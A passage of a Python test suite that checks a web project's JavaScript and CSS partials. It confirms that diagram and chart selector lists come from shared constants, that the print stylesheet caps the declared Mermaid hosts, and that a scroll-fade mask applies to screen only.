    def _read(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "js", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _read_test(self, *parts):
        path = os.path.join(_paths.DEV, "tests", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _read_css(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "css", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _scan_js(self, source):
        """Split JavaScript source into (string-literal contents, code-with-literals-blanked).

        One scan serves both print checks. Literals matter because a re-typed selector can only
        reach the browser through one; the blanked copy matters because `measureCss()`'s CSS
        strings are full of `{`/`}` that would wreck a naive brace match, and because a comment
        that merely NAMES an identifier must not be able to stand in for the code that used it.
        Walking the source keeps quotes and comments straight, where a regex stripper would either
        miss a trailing `//` (false red) or eat a `/*` inside a string (false green).

        REGEX LITERALS ARE NOT MODELLED - they also open with `/`, and one containing a quote
        would flip this scanner into a bogus string and silently swallow real code, which is the
        false-GREEN direction. That is why the scan self-checks below rather than trusting itself:
        a guard against silent drift must not drift silently. `68-export-offline.js`, two sibling
        tests away, already contains such literals, so this is a live maintenance trap and not a
        theoretical one.
        """
        literals, code, i, n = [], [], 0, len(source)
        while i < n:
            ch = source[i]
            if ch == "/" and i + 1 < n and source[i + 1] == "/":
                end = source.find("\n", i)
                end = n if end == -1 else end
                code.append(" " * (end - i))
                i = end
            elif ch == "/" and i + 1 < n and source[i + 1] == "*":
                end = source.find("*/", i + 2)
                self.assertNotEqual(end, -1, "unterminated block comment; the JS scanner cannot "
                                             "read this file, so nothing below can be trusted")
                end += 2
                code.append(" " * (end - i))
                i = end
            elif ch in "\"'`":
                quote, start, i, buf = ch, i, i + 1, []
                while i < n and source[i] != quote:
                    if source[i] == "\\":
                        i += 1
                    if i < n:
                        buf.append(source[i])
                    i += 1
                self.assertLess(i, n, "unterminated string literal; the JS scanner cannot read "
                                      "this file (a regex literal it mistook for a quote?), so "
                                      "nothing below can be trusted")
                i += 1
                literal = "".join(buf)
                if quote != "`":
                    # JS forbids a raw newline in a '' or "" literal, so one here means the scan
                    # desynchronized and is swallowing real code - exactly how a smuggled host
                    # would go unseen. Fail loudly instead of reporting nothing.
                    self.assertNotIn("\n", literal,
                                     "the JS scanner produced a multi-line %s literal, so it has "
                                     "lost track of this file (a regex literal?); teach it the "
                                     "construct rather than trusting these checks" % quote)
                literals.append(literal)
                code.append(" " * (i - start))
            else:
                code.append(ch)
                i += 1
        code = "".join(code)
        # Blanking is length-preserving by construction on every branch; `_function_body` slices
        # by these indices, so assert it rather than assume it.
        self.assertEqual(len(code), len(source), "the JS scanner changed the source length")
        self.assertEqual(code.count("{"), code.count("}"),
                         "braces do not balance after blanking; the JS scanner cannot read this "
                         "file, so any function body it extracts is the wrong span")
        return literals, code

    def _function_body(self, code, name):
        """Return the brace-balanced body of `function <name>(...)` from BLANKED code.

        `code` must be the strings-and-comments-blanked copy from `_scan_js`, for two reasons.
        Braces inside `measureCss()`'s CSS strings would wreck a naive brace match; and an
        assertion about what a function DOES must not be satisfiable by a comment that merely
        NAMES the identifier - commenting out the live read and the live call while leaving both
        words visible in prose is exactly the false green this returns blanked text to prevent.
        """
        start = code.find("function " + name + "(")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines %s(); this check is stale and must be "
                            "re-pointed at whatever replaced it" % name)
        open_brace = code.find("{", start)
        self.assertNotEqual(open_brace, -1, "%s() has no body" % name)
        depth = 0
        for i in range(open_brace, len(code)):
            if code[i] == "{":
                depth += 1
            elif code[i] == "}":
                depth -= 1
                if depth == 0:
                    return code[open_brace + 1:i]
        self.fail("%s() body is not brace-balanced" % name)

    @staticmethod
    def _strip_css_comments(css):
        """CSS has only `/* */`. The prose above a rule explains which hosts it caps, so leaving
        comments in would let a comment SATISFY a check about the selector - the false green that
        makes a drift guard worthless."""
        return re.sub(r"/\*.*?\*/", " ", css, flags=re.S)

    def _mermaid_hosts(self):
        hosts = self._selector_constants().get("CMH_MERMAID_SEL")
        self.assertTrue(hosts,
                        "the runtime no longer declares CMH_MERMAID_SEL (or declares it empty); "
                        "the print parity checks are stale and must be re-pointed at whatever "
                        "replaced it")
        # `_printMermaidCapSel()` in 83-print.js derives the print cap by splitting this constant
        # on "," and wrapping each part, and this file's CSS pin matches one `<element>.<class>`
        # token per host. A host carrying a nested comma (`:is(pre,div).mermaid`, an attribute
        # selector) or no element prefix would break one or both silently, and a single invalid
        # selector makes a browser drop the ENTIRE tall-media rule - which also caps figures and
        # images. Fail loudly here instead, so the vocabulary cannot outgrow its consumers
        # without anyone noticing.
        for host in hosts:
            self.assertRegex(
                host, r"^[A-Za-z][\w-]*\.[\w-]+$",
                "CMH_MERMAID_SEL host %r is no longer a flat `<element>.<class>` selector. Two "
                "things depend on that shape: the comma-splitting derivation in "
                "_printMermaidCapSel() (assets/js/83-print.js), and the CSS pin in this file, "
                "which scans 92-print.css for one such token per host. Teach whichever of them "
                "the new shape rather than leaving the runtime to emit an invalid selector that "
                "drops the whole cap." % host)
        return hosts

    def _selector_constants(self):
        """Resolve `03-selectors.js` into {constant name: [selector, ...]}.

        The values are string literals concatenated with earlier constants, so evaluate them in
        declaration order rather than assuming any one shape - a future constant built from two
        others must resolve too, or this check silently stops covering it. Tokens are scanned
        rather than split on `+`, because `+` is also a CSS sibling combinator.
        """
        source = self._read("03-selectors.js")
        term_re = re.compile(r"\"([^\"]*)\"|'([^']*)'|`([^`]*)`|([A-Za-z_$][\w$]*)")
        values = {}
        for name, expr in self._CONST_RE.findall(source):
            out = []
            for m in term_re.finditer(expr):
                literal = next((g for g in m.groups()[:3] if g is not None), None)
                if literal is not None:
                    out.append(literal)
                    continue
                ref = m.group(4)
                self.assertIn(ref, values,
                              "%s is built from %r, which is not a string literal or an "
                              "already-declared selector constant" % (name, ref))
                out.append(values[ref])
            values[name] = "".join(out)
        self.assertTrue(values, "no selector constants found in 03-selectors.js")
        # A declaration this parser could not read would be silently DROPPED, and the parity check
        # would keep passing while that selector quietly stopped being pinned - the exact silent
        # regression these tests exist to prevent. Fail loudly instead.
        self.assertEqual(
            len(values), len(re.findall(r"^const CMH_[A-Z0-9_]+\s*=", source, re.M)),
            "a selector constant in 03-selectors.js was not parsed; teach _CONST_RE its shape "
            "rather than leaving it unpinned")
        return {name: [p.strip() for p in value.split(",") if p.strip()]
                for name, value in values.items()}

    def test_the_per_library_families_match_the_runtimes_own_two_constants(self):
        # The union parity test below proves the detector and the runtime agree about what rich
        # content IS. It says nothing about WHICH library each shape belongs to - and once the
        # payload is per-library, mis-attributing a selector drops the wrong half. The runtime keeps
        # the two questions in separate constants (`_offlineDocUsesMermaid` queries CMH_MERMAID_SEL,
        # `_offlineDocUsesCharts` queries CMH_CHART_CANVAS_SEL), so pin each family to ITS OWN
        # constant, read from the JS source - not merely against the Python union.
        constants = self._selector_constants()
        self.assertEqual(set(vendored_libs.MERMAID_SELECTORS), set(constants["CMH_MERMAID_SEL"]),
                         "the diagram family drifted from the runtime's CMH_MERMAID_SEL")
        self.assertEqual(set(vendored_libs.CHART_SELECTORS),
                         set(constants["CMH_CHART_CANVAS_SEL"]),
                         "the chart family drifted from the runtime's CMH_CHART_CANVAS_SEL")

    def test_the_detector_attributes_each_library_the_way_the_runtime_does(self):
        # The behavioural half of the parity above: the flags the author-time scan sets must match
        # what the runtime's two predicates would answer for the same document.
        mermaid_scan = vendored_libs._scan(_doc(MERMAID))
        chart_scan = vendored_libs._scan(_doc(CHART))
        self.assertTrue(mermaid_scan.uses_mermaid)
        self.assertFalse(mermaid_scan.uses_charts,
                         "a diagram must not be attributed to the chart library")
        self.assertTrue(chart_scan.uses_charts)
        self.assertFalse(chart_scan.uses_mermaid,
                         "a chart must not be attributed to the diagram library")

    def test_every_chart_shape_the_runtime_draws_is_attributed_to_the_chart_family(self):
        # Each spelling in CMH_CHART_CANVAS_SEL, asserted INDEPENDENTLY so a family that quietly
        # stops recognising one of them fails here rather than by dropping a needed payload half.
        shapes = (
            '<figure class="chart"><canvas id="a"></canvas></figure>',
            '<canvas id="b" class="cmh-chart"></canvas>',
            '<canvas id="c" data-cmh-chart-points="[1,2]"></canvas>',
            '<canvas id="d" data-cmh-chart-source="s"></canvas>',
        )
        for shape in shapes:
            with self.subTest(shape=shape):
                scan = vendored_libs._scan(_doc("<h1>c</h1>" + shape))
                self.assertTrue(scan.uses_charts, "not recognised as chart usage")
                self.assertFalse(scan.uses_mermaid, "wrongly attributed to the diagram library")

    def test_every_diagram_shape_the_runtime_renders_is_attributed_to_the_diagram_family(self):
        for shape in ('<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>',
                      '<div class="mermaid cm-skip">graph TD; A--&gt;B;</div>'):
            with self.subTest(shape=shape):
                scan = vendored_libs._scan(_doc("<h1>d</h1>" + shape))
                self.assertTrue(scan.uses_mermaid, "not recognised as diagram usage")
                self.assertFalse(scan.uses_charts, "wrongly attributed to the chart library")

    def test_the_two_families_are_disjoint(self):
        # Their UNION is `RUNTIME_SELECTORS` by construction, so asserting that proves nothing.
        # Disjointness does not follow from the definition and is what keeps a selector from being
        # counted for both libraries.
        self.assertEqual(set(vendored_libs.MERMAID_SELECTORS) & set(vendored_libs.CHART_SELECTORS),
                         set())

    def test_the_selector_set_matches_the_runtimes_exactly(self):
        """Two-directional: catches the runtime ADDING a selector, not just removing one.

        Asserting only that the known selectors are still present would keep passing if someone
        taught the exporter a NEW chart shape while the stripper silently missed it - exactly the
        false negative that deletes a payload the export then demands. Nothing is filtered on the
        words "chart"/"mermaid" either: a keyword filter would silently drop a future selector
        such as `canvas[data-cmh-visual]` and quietly re-open the hole this test exists to close.
        """
        consts = self._selector_constants()
        self.assertIn("CMH_RICH_CONTENT_SEL", consts,
                      "the runtime no longer declares CMH_RICH_CONTENT_SEL; the parity check is "
                      "stale and must be re-pointed at whatever replaced it")
        self.assertEqual(
            set(consts["CMH_RICH_CONTENT_SEL"]), set(vendored_libs.RUNTIME_SELECTORS),
            "the runtime's rich-content selectors and vendored_libs.RUNTIME_SELECTORS have "
            "diverged. Update RUNTIME_SELECTORS *and* the detector, or a document using the new "
            "shape will be stripped of a payload its own offline export needs.")

    def test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals(self):
        """The single-definition invariant itself (issue #740).

        Re-typing a selector list inside an offline-usage function is how the exporter and the
        live renderer came to disagree about what a chart is. Fail on any string literal passed
        to querySelector there, so the drift cannot come back.

        `_offlineDocNeedsChartLib` is in the list because it is the function that actually decides
        whether the export inlines Chart.js. It carries the chart-canvas selector a SECOND time,
        and pinning it to the SAME constant as the shape gate is what stops the two from drifting
        apart - a document whose chart one of them recognises and the other does not would lose
        the library its export needs. Functions that scan `script` elements for evidence
        (`_offlineDocReferencesChartLib`) are deliberately NOT in the list: their selector is not
        a content shape.
        """
        source = self._read("68-export-offline.js")
        expected = {
            "_offlineLiveDocNeedsRichLibs": "CMH_RICH_CONTENT_SEL",
            "_offlineDocUsesMermaid": "CMH_MERMAID_SEL",
            "_offlineDocUsesCharts": "CMH_CHART_CANVAS_SEL",
            "_offlineDocNeedsChartLib": "CMH_CHART_CANVAS_SEL",
        }
        for fn, constant in expected.items():
            start = source.find("function " + fn)
            self.assertNotEqual(start, -1,
                                "the runtime no longer defines %s; the parity check is stale "
                                "and must be re-pointed at whatever replaced it" % fn)
            body = source[start:source.find("\n}", start)]
            self.assertTrue(
                re.search(r"querySelector(?:All)?\(\s*" + re.escape(constant) + r"\s*\)", body),
                "%s must query the shared %s constant" % (fn, constant))
            self.assertEqual(
                re.findall(r"querySelector(?:All)?\(\s*[\"'`]", body), [],
                "%s passes a selector literal instead of the shared constant" % fn)

    def test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for(self):
        """Anything the chart renderer draws must be something the export inlines Chart.js for."""
        consts = self._selector_constants()
        renderer = self._read("30-images.js")
        self.assertIn("root.querySelectorAll(CMH_CHART_DATA_SEL)", renderer,
                      "the live chart renderer must select the shared CMH_CHART_DATA_SEL set")
        self.assertTrue(
            set(consts["CMH_CHART_DATA_SEL"]).issubset(set(consts["CMH_CHART_CANVAS_SEL"])),
            "the renderer's chart selectors must be a subset of the exporter's, or a chart can "
            "render live and then export blank")

    def test_no_other_partial_re_types_a_declared_selector_list_verbatim(self):
        """A backstop against the coarsest form of re-typing: copying a declared list wholesale.

        It is deliberately narrow. It does NOT catch a VARIANT of a declared list (the historical
        drift was a variant, not a copy - `canvas.cmh-chart[data-cmh-chart-points], ...` versus
        `figure.chart canvas, canvas.cmh-chart`); component-level matching would fire on the many
        places that legitimately query `pre.mermaid` or `figure.chart` alone for a different
        purpose. The real guarantee against a variant is that the consumers query the constants
        (`test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals` and
        `test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for`); this only
        stops a copy from quietly becoming a second source of truth.
        """
        # Only LISTS are guarded: re-typing an assembled multi-selector list is the drift this
        # exists to catch, while a single token like `figure.chart` is ordinary CSS that other
        # layers legitimately query on its own.
        declared = {", ".join(sel_list) for sel_list in self._selector_constants().values()
                    if len(sel_list) > 1}
        self.assertTrue(declared, "no multi-selector constants declared in 03-selectors.js")
        call_re = re.compile(
            r"(?:querySelectorAll|querySelector|closest|matches)\(\s*[\"'`]([^\"'`]+)[\"'`]")
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        for name in sorted(os.listdir(js_dir)):
            if name == "03-selectors.js" or not name.endswith(".js"):
                continue
            body = self._read(name)
            for used in call_re.findall(body):
                normalized = ", ".join(p.strip() for p in used.split(",") if p.strip())
                self.assertNotIn(
                    normalized, declared,
                    "%s re-types the selector list %r that 03-selectors.js already declares; "
                    "query the shared constant instead" % (name, used))

    def test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant(self):
        """CMH-PRINT-07: the measure CSS must DERIVE its diagram hosts, not re-type them.

        `83-print.js` builds a CSS string it applies under screen media to measure single-page
        height (CMH-PRINT-06). Its tall-media cap has to name the mermaid hosts, and re-typing
        them there is exactly how `div.mermaid` fell out of the cap while `pre.mermaid` kept it:
        the list was written once from memory as `pre.mermaid` alone and then never revisited when
        the runtime learned the second host. Deriving from `CMH_MERMAID_SEL` makes that class of
        drift impossible rather than merely fixed once.

        Three things are asserted, because any one alone is false-greenable: the helper really
        reads the shared constant, `measureCss()` really CONCATENATES the helper's result (a call
        whose value is discarded would leave the cap gone), and no string literal in the file
        re-types a host behind the helper's back. All of it runs on comment-blanked code, so a
        comment naming an identifier cannot stand in for the code that used to use it.
        """
        source = self._read("83-print.js")
        literals, code = self._scan_js(source)
        # `_scan_js` deliberately models strings and comments but NOT regex literals, which also
        # open with "/" and would leave stray braces and quotes in the code stream - silently
        # pointing every check below at the wrong text. Nothing in this partial uses a regex
        # literal (or a division) today, so assert that stays true rather than assuming it.
        self.assertNotIn(
            "/", code,
            "83-print.js now has a '/' outside a string or comment (a regex literal or a "
            "division). _scan_js models neither, so it can no longer be trusted to blank strings "
            "or match braces here; teach it the new construct before relying on this guard.")
        helper = self._function_body(code, "_printMermaidCapSel")
        self.assertIn("CMH_MERMAID_SEL", helper,
                      "_printMermaidCapSel() must build the cap selector from the shared "
                      "CMH_MERMAID_SEL constant declared in 03-selectors.js")
        measure = self._function_body(code, "measureCss")
        self.assertIn("+ _printMermaidCapSel()", measure,
                      "measureCss() must CONCATENATE _printMermaidCapSel() into its selector "
                      "list; a bare call whose result is dropped, or a helper nothing calls at "
                      "all, leaves the measured page uncapped for diagrams")
        for host in self._mermaid_hosts():
            for literal in literals:
                self.assertNotIn(
                    host, literal,
                    "83-print.js re-types the mermaid host %r that 03-selectors.js already "
                    "declares (in the string literal %r); derive it from CMH_MERMAID_SEL instead, "
                    "or the two can drift again" % (host, literal))
            # Splitting a host across two concatenated literals ("#commentRoot pre" + ".mermaid
            # svg,") re-types it just as effectively while defeating a per-literal scan, so check
            # the run of literals as one string too.
            self.assertNotIn(
                host, "".join(literals),
                "83-print.js re-types the mermaid host %r that 03-selectors.js already declares, "
                "split across concatenated string literals; derive it from CMH_MERMAID_SEL "
                "instead" % host)

    def test_the_clip_layer_derives_its_containers_from_the_shared_constant(self):
        """CMH-RESP-02: the clip-container selectors must DERIVE their hosts, not re-type them.

        `_clipContainersFor()` in `20-mermaid.js` resolves the boxes a floating diagram control is
        clamped to. Its container lists have to name the mermaid hosts, and re-typing them there is
        exactly how a standalone `div.mermaid` fell out of the clip layer while `pre.mermaid` kept
        it (issue #769): the list was written once as `pre.mermaid` alone and never revisited when
        the runtime learned the second host. The sibling backstop
        (`test_no_other_partial_re_types_a_declared_selector_list_verbatim`) cannot catch this - it
        only matches a WHOLESALE copy of a declared list, and the historical bug was a VARIANT
        (`pre.mermaid, figure.chart, table, .cmh-diff-raw`), which normalizes to a string that is
        not in `declared` and so passes. This pins the derivation itself, mirroring
        `test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant` for the
        print surface.

        Three things are asserted, because any one alone is false-greenable: the token list really
        reads the shared constant, both selectors really BUILD from those tokens (a list that
        merely sits beside them is not wired up), and no string literal in the file re-types a
        host behind their back. All of it runs on comment-blanked code, so a comment naming an
        identifier cannot stand in for the code that used to use it.
        """
        source = self._read("20-mermaid.js")
        literals, code = self._scan_js(source)
        self.assertIn(
            "CMH_MERMAID_SEL", code,
            "20-mermaid.js no longer reads the shared CMH_MERMAID_SEL constant; the clip-container "
            "selectors must derive their diagram hosts from 03-selectors.js, not re-type them")
        # The normalized token list is the single seam both selectors build from. Pin that BOTH are
        # built from it: a derived gallery list beside a hand-typed clip list is exactly the
        # half-migrated state issue #769 fixed.
        self.assertRegex(
            code, r"var MERMAID_HOST_TOKENS\s*=[^;]*CMH_MERMAID_SEL",
            "MERMAID_HOST_TOKENS must be built from CMH_MERMAID_SEL, so every clip-container "
            "selector in this partial shares one normalization of the shared vocabulary")
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var %s\s*=[^;]*MERMAID_HOST_TOKENS" % name,
                "%s must be BUILT from MERMAID_HOST_TOKENS; a list that re-types the hosts (or is "
                "assembled some other way) can drift from the vocabulary again" % name)
        # And the resolver has to actually USE them - a derived constant nothing queries leaves the
        # clip layer on whatever literal replaced it. Both vocabularies now meet in ONE walk
        # selector (CMH-RESP-12 intersects the whole chain of clipping ancestors), so pin that seam
        # in both directions: the walk selector is built from both lists, and the resolver queries
        # the walk selector.
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var CLIP_CHAIN_SEL\s*=[^;]*%s" % name,
                "CLIP_CHAIN_SEL must be built from %s; a walk selector that re-types either "
                "vocabulary can drift from it again" % name)
        resolver = self._function_body(code, "_clipContainersFor")
        self.assertIn(
            "CLIP_CHAIN_SEL", resolver,
            "_clipContainersFor() must query CLIP_CHAIN_SEL; a derived selector the resolver never "
            "uses does not clip anything")
        for host in self._mermaid_hosts():
            self.assertNotIn(
                host, "".join(literals),
                "20-mermaid.js re-types the mermaid host %r that 03-selectors.js already declares "
                "(including split across concatenated string literals); derive it from "
                "CMH_MERMAID_SEL instead, or the two can drift again" % host)

    def test_the_print_stylesheet_caps_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-07: pin the one surface that CANNOT import the constant.

        `92-print.css` is a plain stylesheet: it has no way to reference a JS constant, so it is
        the one place the mermaid vocabulary is unavoidably spelled out. Pin it two-directionally
        instead, exactly as `vendored_libs.RUNTIME_SELECTORS` is pinned for the Python detector -
        every declared host must be capped, and no OTHER `.mermaid` host may be. Then the printed
        cap (this stylesheet) and the measured cap (`measureCss()`, derived above) can never again
        disagree about what a diagram host is: capping a host in one but not the other either
        prints an oversized diagram or measures a height the print never produces.

        Comments are stripped FIRST. The prose above the rule explains which hosts it caps, so a
        comment could otherwise satisfy this check on its own - delete `div.mermaid svg` from the
        selector, mention it in the comment, and an unstripped scan still passes while the cap is
        gone. That is precisely the silent half-vocabulary regression this test exists to catch.

        There are TWO 8.4in rules since CMH-PRINT-09: the BASE tall-media cap, which is the one the
        vocabulary pin is about, and the narrower rule that RE-APPLIES the cap to a diagram-gallery
        card (a card is a compact thumbnail, so it keeps the fit-one-page cap the width binding takes
        away everywhere else). They are told apart by structure, not by order: only the gallery rule
        names `.cmh-diagram-gallery`. Both are pinned - the base one against the shared vocabulary,
        the gallery one against the marker pair it must keep naming - so neither can be dropped or
        silently broadened into the other.
        """
        css = self._strip_css_comments(self._read_css("92-print.css"))
        blocks = [m for m in re.finditer(r"([^{}]*)\{([^{}]*max-height:\s*8\.4in[^{}]*)\}", css)]
        self.assertEqual(len(blocks), 2,
                         "expected exactly two 8.4in cap rules in 92-print.css (the base tall-media "
                         "cap and the diagram-gallery re-application); found %d. Re-point this check "
                         "at whatever replaced them." % len(blocks))
        base = [m for m in blocks if "cmh-diagram-gallery" not in m.group(1)]
        gallery = [m for m in blocks if "cmh-diagram-gallery" in m.group(1)]
        self.assertEqual(len(base), 1,
                         "exactly one 8.4in cap rule must be the BASE tall-media cap (the one that "
                         "does not scope itself to a diagram gallery); found %d" % len(base))
        self.assertEqual(len(gallery), 1,
                         "exactly one 8.4in cap rule must be the diagram-gallery re-application; "
                         "found %d" % len(gallery))
        # The gallery rule exists to keep a gallery CARD on the fit-one-page cap after CMH-PRINT-09
        # binds every other tall-narrow diagram on width. It only does that while it stays keyed to
        # BOTH marker classes and targets the rendered svg - broaden it and it would re-cap every
        # tall-narrow diagram, undoing CMH-PRINT-09; narrow it and a card prints many pages tall.
        gallery_selector = re.sub(r"\[[^\]]*\]", "[]", gallery[0].group(1))
        for needed in (".cmh-diagram-gallery", ".cm-mermaid-host", ".cmh-diagram-tall"):
            self.assertIn(
                needed, gallery_selector,
                "the diagram-gallery 8.4in rule must stay keyed on %s, or it stops re-applying the "
                "cap to exactly a gallery card's tall-narrow diagram (selector: %r)"
                % (needed, gallery_selector.strip()))
        self.assertRegex(
            gallery_selector, r"\.cmh-diagram-tall\s+svg(?![\w-])",
            "the diagram-gallery cap must target the rendered `svg` INSIDE the host, not the host "
            "box (selector: %r)" % gallery_selector.strip())
        selector = base[0].group(1)
        # An attribute-selector VALUE is not a capped host: `[data-x="div.mermaid svg"]` would
        # otherwise satisfy every check below while the real cap was deleted - the same
        # "text near the rule stands in for the rule" hole the comment stripping above closes.
        selector = re.sub(r"\[[^\]]*\]", "[]", selector)
        # Collect every `<element>.<class> svg` arm the rule caps, WITHOUT hard-coding ".mermaid":
        # a future vocabulary with a different class name must still be checked, not silently
        # skipped. The trailing boundary matters too - `pre.mermaid svgx` is not a cap on the
        # rendered SVG, and a plain substring test would accept it.
        capped = set(re.findall(r"([A-Za-z][\w-]*\.[\w-]+)\s+svg(?![\w-])", selector))
        self.assertEqual(
            capped, set(self._mermaid_hosts()),
            "the print stylesheet's tall-media cap and the shared CMH_MERMAID_SEL vocabulary have "
            "diverged (capped `<host> svg`: %s; declared: %s). A declared host that is NOT capped "
            "prints an unconstrained diagram that overflows the page; a capped host that is no "
            "longer declared is dead CSS. Note the cap must target the rendered `svg` INSIDE the "
            "host, not the host box." % (sorted(capped), sorted(self._mermaid_hosts())))

    @staticmethod
    def _blank_css_strings(css):
        """Return `css` with every string literal's CONTENT replaced by spaces (length preserved).

        Braces, semicolons, and quotes inside a `content: "..."` value are text, not structure, but
        a flat brace walk cannot tell the difference: a `content: "}"` would end a declaration block
        early and strip the media context off every rule after it. Blanking the strings up front
        makes the walk - and the precondition checks that follow it - structure-only, so an ordinary
        string value is never mistaken for a defect (and an apostrophe inside a double-quoted label
        is not a false red). Offsets are preserved so slices still line up with the original text.
        """
        out, quote, i, n = list(css), None, 0, len(css)
        while i < n:
            ch = css[i]
            if quote:
                if ch == "\\":
                    if i + 1 < n:
                        out[i + 1] = " "
                    out[i] = " "
                    i += 2
                    continue
                if ch == quote:
                    quote = None
                else:
                    out[i] = " "
            elif ch in ('"', "'"):
                quote = ch
            i += 1
        return "".join(out)

    def _iter_css_rules(self, css, name="<css>"):
        """Yield `(at_rule_preludes, selector, declarations)` for every rule in a stylesheet.

        A plain scan, not a CSS parser: string literals are blanked first (so a brace or semicolon
        inside a value is never read as structure), then it tracks the stack of enclosing at-rule
        preludes so a rule's media context is known. What it still cannot model - CSS nesting, an
        at-rule that carries no block, unbalanced braces - is ASSERTED, naming the offending FILE,
        rather than assumed. Get any of that wrong silently and the scan mis-attributes a rule's
        media context, which either hides a print-scoped mask or blames this file for a construct
        introduced in a different partial. `_scan_js` above self-checks for the same reason: a guard
        against silent drift must not drift silently. Feed it COMMENT-STRIPPED text, so prose
        describing a rule cannot stand in for it.
        """
        css = self._blank_css_strings(css)
        rules, stack, i, start, n = [], [], 0, 0, len(css)
        while i < n:
            ch = css[i]
            if ch == "{":
                prelude = css[start:i].strip()
                self.assertNotIn(
                    ";", prelude,
                    "%s has a `;` inside the prelude %r, so this scanner cannot tell where the "
                    "block starts. Either an at-rule that carries no block (`@import`, "
                    "`@layer base;`, `@charset`) merged into it, or an at-rule follows declarations "
                    "inside a block (an `@page` margin box such as `@bottom-center`). Teach this "
                    "scanner the construct before relying on it." % (name, prelude[:120]))
                if prelude.startswith("@"):
                    stack.append(prelude)
                    i += 1
                    start = i
                    continue
                end = css.find("}", i)
                end = n if end == -1 else end
                decls = css[i + 1:end]
                self.assertNotIn(
                    "{", decls,
                    "%s now has a declaration block containing a nested `{` (CSS nesting). This "
                    "scanner is a flat brace walk and would mis-read the media context of the rules "
                    "around it - teach it the new construct before relying on it. Block: %r"
                    % (name, decls[:120]))
                rules.append((tuple(stack), prelude, decls))
                i = end + 1
                start = i
                continue
            if ch == "}":
                if stack:
                    stack.pop()
                i += 1
                start = i
                continue
            i += 1
        self.assertEqual(
            stack, [],
            "%s left at-rule(s) %s unclosed when the scan finished, so every rule's media context "
            "is suspect. Braces do not balance (or an unsupported construct fooled the scan)."
            % (name, stack))
        return rules

    @staticmethod
    def _is_screen_only_media(prelude):
        """True only when EVERY comma branch of an `@media` prelude requires the screen type.

        A media list is a union, so one permissive branch admits print: `@media screen, all` and
        `@media screen, (min-width: 0px)` both match a printer while still starting with the word
        `screen`. Requiring every branch to name `screen` is what makes this guard mean what it
        says. `only screen` is the same media type with the legacy hack prefix, so it counts. The
        prelude is whitespace-normalized and matched case-insensitively first, so a wrapped or
        upper-case query is not a false red about a query that in fact never matches paper.
        """
        prelude = " ".join(prelude.split())
        if not prelude.lower().startswith("@media"):
            return False
        query = prelude[len("@media"):]
        branches = [b.strip() for b in query.split(",")]
        return bool(branches) and all(
            re.match(r"^(only\s+)?screen(\s+and\b.*)?$", branch, re.I) for branch in branches)

    @staticmethod
    def _mask_image_values(decls, prefixed=False):
        """Every `mask-image` (or `-webkit-mask-image`) value declared in a declaration block.

        The value is CAPTURED rather than pattern-matched in place: a `\\s*(?!none)` style lookahead
        can backtrack to consume no whitespace and then happily "not see" the `none` that follows,
        which is exactly how a reset would have been mistaken for the cue.
        """
        pattern = r"-webkit-mask-image\s*:\s*([^;}]*)" if prefixed else r"(?<![-\w])mask-image\s*:\s*([^;}]*)"
        return [v.strip() for v in re.findall(pattern, decls)]

    def test_the_diagram_scroll_fade_mask_is_screen_only_on_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-08: the scroll cue lives in a screen-only context, so print cannot inherit it.

        The edge fade tells a reader a wide diagram scrolls horizontally inside its own box. Paper
        does not scroll, so a mask that survives into print only washes out the printed diagram's
        edges. The expression is to declare the mask `screen`-only at its single source rather than
        to add a print-scoped reset in `92-print.css`: the cue is a pure screen affordance, and a
        reset would be a redundant SECOND rule naming the same host set, which is exactly the shape
        that let `div.mermaid` fall out of the tall-media cap while `pre.mermaid` kept it
        (CMH-PRINT-07).

        Pinned in both directions, across every stylesheet partial: EVERY rule that masks a
        scroll-fade host sits in a screen-only `@media` context (each comma branch of the query must
        name `screen`, since a media list is a union and one permissive branch would admit print),
        and the union of the hosts they fade is exactly the shared `CMH_MERMAID_SEL` vocabulary - so
        the mask can neither leak back into print nor fade one host shape while leaving the other
        alone. Rules are counted rather than required to be exactly one, so a behavior-preserving
        split (one rule per host, or a theme variant) is not a false red, while a leaked print
        duplicate still fails on its own media context.

        This pin owns the MEDIA CONTEXT and the host set; that the cue is still LIVE on screen is
        owned by the browser specs (`68-print.spec.js` CMH-PRINT-08 and `51-charts-mobile.spec.js`
        CMH-RESP-09), which read the computed style. It also owns the prefixed/unprefixed pair:
        Chromium aliases `-webkit-mask-image` and `mask-image` into one computed value, so no
        browser assertion in this Chromium-only suite can tell them apart, while the standalone
        reports are opened in arbitrary browsers where both declarations matter.
        """
        css_dir = os.path.join(_paths.DEV, "assets", "css")
        faded = []
        for name in sorted(os.listdir(css_dir)):
            if not name.endswith(".css"):
                continue
            css = self._strip_css_comments(self._read_css(name))
            for media, selector, decls in self._iter_css_rules(css, name):
                # Anchored matches: `.cmh-diagram-scroll-fades` is not the class, a bare
                # `mask-image` substring test would be satisfied by `-webkit-mask-image` alone, and
                # the VALUE matters too - a rule that sets the mask to `none` is a RESET, not the
                # cue, so collecting it here would fail a defensive print reset with a message
                # asserting the exact opposite of what that rule does.
                masks = self._mask_image_values(decls)
                if (re.search(r"\bcmh-diagram-scroll-fade\b(?![-\w])", selector)
                        and any(value and value != "none" for value in masks)):
                    faded.append((name, media, selector, decls))
        self.assertTrue(
            faded,
            "no scroll-fade mask rule found in any CSS partial. Either the cue was deleted (a wide "
            "diagram no longer signals that it scrolls) or it moved somewhere this check cannot "
            "see; re-point this check at whatever replaced it.")
        hosts = set()
        for name, media, selector, decls in faded:
            self.assertTrue(
